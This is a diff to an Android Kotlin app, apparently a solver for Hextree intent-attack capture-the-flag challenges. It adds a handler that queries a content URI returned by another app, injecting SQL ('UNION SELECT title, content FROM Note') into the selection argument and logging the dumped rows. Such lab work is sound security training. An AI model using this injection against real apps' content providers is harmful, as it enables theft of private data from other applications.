@@ -4,6 +4,8 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.database.Cursor
+import android.database.DatabaseUtils
 import android.net.Uri
 import android.os.Bundle
 import android.util.Log
@@ -22,6 +24,7 @@ import androidx.compose.runtime.Composable
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.tooling.preview.Preview
 import androidx.compose.ui.unit.dp
+import androidx.core.net.toUri
 import com.pachinko.intentattacksurface.ui.theme.IntentAttackSurfaceTheme
 import com.pachinko.intentattacksurface.utils.*
 
@@ -39,6 +42,29 @@ class MainHextreeActivity : ComponentActivity() {
         val flag9Launcher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
             Log.d("Flag9 Receiver", "Result code: ${result.resultCode}")
             Utils.showDialog(this, result.data ?: Intent())
+        }
+
+        val flag33Launcher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
+            Log.d("Flag33 Receiver", "Result code: ${result.resultCode}")
+            val data = result.data?.data!!
+
+            try {
+                val projection: Array<String> = arrayOf("name", "value")
+                val cursor: Cursor? = contentResolver.query(
+                    data,
+                    projection, "visible=1 UNION SELECT title, content FROM Note",
+                    null, null
+                )
+                cursor?.use {
+                    val cursorDump = DatabaseUtils.dumpCursorToString(it)
+                    Log.d("Flag32", "Cursor Data:\n$cursorDump")
+                } ?: run {
+                    Log.e("Flag32", "Cursor returned null. Check authority or visibility.")
+                }
+                cursor?.close()
+            } catch (e: Error) {
+                Log.e("Flag33Err", e.message.toString())
+            }
         }
 
         val flag18IntentFilter = IntentFilter("io.hextree.broadcast.FREE_FLAG")
@@ -98,7 +124,7 @@ class MainHextreeActivity : ComponentActivity() {
                     30 -> Flag30.getFlag(this)
                     31 -> Flag31.getFlag(this)
                     32 -> Flag32.getFlag(this)
-                    33 -> Flag33.getFlag(this)
+                    33 -> Flag33.getFlag(this, flag33Launcher)
                     34 -> Flag34.getFlag(this)
                     35 -> Flag35.getFlag(this)
                     36 -> Flag36.getFlag(this)
